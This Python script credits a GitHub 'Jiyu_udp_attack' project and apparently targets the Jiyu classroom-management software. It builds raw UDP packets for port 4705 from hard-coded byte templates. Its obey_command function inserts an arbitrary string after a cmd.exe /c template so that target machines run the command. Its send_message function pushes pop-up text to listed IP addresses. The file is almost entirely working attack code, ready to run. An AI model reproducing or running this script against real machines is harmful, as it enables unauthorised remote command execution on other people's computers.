#参考https://github.com/ht0Ruial/Jiyu_udp_attack
import socket
from struct import pack

store = {'obey_command':[0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x6e, 0x03, 0x00, 0x00, 0x5b, 0x68, 0x2b, 0x25, 
                         0x6f, 0x61, 0x64, 0x4d, 0xa7, 0x92, 0xf0, 0x47, 0x00, 0xc5, 0xa4, 0x0e, 0x20, 0x4e, 0x00, 0x00, 
                         0xc0, 0xa8, 0x64, 0x86, 0x61, 0x03, 0x00, 0x00, 0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 
                         0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3a, 0x00, 
                         0x5c, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 
                         0x5c, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6d, 0x00, 0x33, 0x00, 
                         0x32, 0x00, 0x5c, 0x00, 0x63, 0x00, 0x6d, 0x00, 0x64, 0x00, 0x2e, 0x00, 0x65, 0x00, 0x78, 0x00, 
                         0x65] 
                         + [0x00]*459 
                         + [0x2f, 0x00, 0x63, 0x00, 0x20] 
                         + [0x00]*315 
                         + [0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
         'send_message':[0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00, 0x10, 0x41, 0xaf, 0xfb, 
                         0xa0, 0xe7, 0x52, 0x40, 0x91, 0xdc, 0x27, 0xa3, 0xb6, 0xf9, 0x29, 0x2e, 0x20, 0x4e, 0x00, 0x00, 
                         0xc0, 0xa8, 0x50, 0x81, 0x91, 0x03, 0x00, 0x00, 0x91, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 
                         0x00, 0x00, 0x00, 0x00, 0x05] 
                         + [0x00]*901}

def format_content(content: str) -> list[int]:
    arr = []
    for ch in content:
        tmp = ''.join(list(map(lambda x: hex(ord(x)), ch)))
        if int(tmp, 16) > 0xff:
            tmp = tmp[2:]
            high = int((tmp[0] + tmp[1]), 16)
            low = int((tmp[2] + tmp[3]), 16)
            arr.append(low)
            arr.append(high)
        else:
            high = 0
            low = int((tmp[2] + tmp[3]), 16)
            arr.append(low)
            arr.append(high)
    return arr

def send(ips: list[str], content: list[int]):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    port = 4705
    payload = pack(f"{len(content)}B", *content)

    for ip in ips:
        client.sendto(payload, (ip, port))

def obey_command(ips: list[str], content: str):
    arrs = format_content(content)
    index = 56
    content = store['obey_command']
    for elem in arrs:
        content[index] = elem
        index += 1
    
    send(ips, content)

def send_message(ips: list[str], content: str):
    arrs = format_content(content)
    index = 578
    content = store['send_message']
    for elem in arrs:
        content[index] = elem
        index += 1
    
    send(ips, content)

if __name__ == '__main__':
    obey_command(['198.162.112.1'], 'echo hello')
    send_message(['198.162.112.1'], 'hello')
